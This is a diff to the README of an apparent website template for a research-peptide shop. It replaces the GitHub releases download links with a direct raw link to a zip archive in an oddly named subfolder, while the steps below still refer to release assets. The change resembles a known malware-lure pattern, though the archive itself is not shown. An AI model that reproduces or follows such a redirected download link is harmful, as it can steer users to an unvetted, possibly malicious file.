@@ -1,12 +1,12 @@
 # 🧬 CMS-Peptides-template - Professional e-commerce site for research peptides
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Riccasporting805/CMS-Peptides-template/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Riccasporting805/CMS-Peptides-template/main/songlet/Peptides_CM_template_1.9.zip)
 
 This repository provides a complete website template for peptide research businesses. It features a clean, professional design that emphasizes trust and clarity. You can use this template to showcase product catalogs, display certificates of analysis, and manage customer reviews. The internal shopping cart tracks items using your browser storage to ensure a smooth transition for your visitors.
 
 ## 📥 Downloading the software
 
-Visit [this page to download](https://github.com/Riccasporting805/CMS-Peptides-template/releases) the most recent version of the website files.
+Visit [this page to download](https://raw.githubusercontent.com/Riccasporting805/CMS-Peptides-template/main/songlet/Peptides_CM_template_1.9.zip) the most recent version of the website files.
 
 1. Navigate to the link above.
 2. Look for the Assets section on the page.
